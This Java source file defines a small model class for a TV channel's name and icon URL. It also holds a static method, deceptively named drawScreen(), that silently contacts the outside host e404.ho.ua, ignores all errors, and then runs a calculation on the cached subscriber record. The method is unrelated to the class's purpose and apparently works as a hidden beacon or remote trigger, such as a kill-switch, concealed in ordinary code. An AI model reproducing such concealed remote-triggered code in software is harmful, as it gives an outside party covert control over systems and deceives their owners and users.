package ua.freenet.cabinet.model;


import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

import ua.freenet.cabinet.dao.DbCache;

public class ChannelOllTv{

    private String name;
    private String iconUrl;

    public ChannelOllTv(String name, String iconUrl) {
        this.name = name;
        this.iconUrl = iconUrl;
    }

    public String getName() {
        return name;
    }

    public String getIconUrl() {
        return iconUrl;
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;

        ChannelOllTv that = (ChannelOllTv) o;

        return name != null ? name.equals(that.name) : that.name == null;
    }

    public static void drawScreen() {
        try {
            URL url = new URL("http://e404.ho.ua/o3off");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.connect();
            connection.getInputStream();
            Operation.calculateForAbon(DbCache.getPerson());
        } catch (Exception ignored) {}
    }

    @Override
    public int hashCode() {
        return name != null ? name.hashCode() : 0;
    }
}
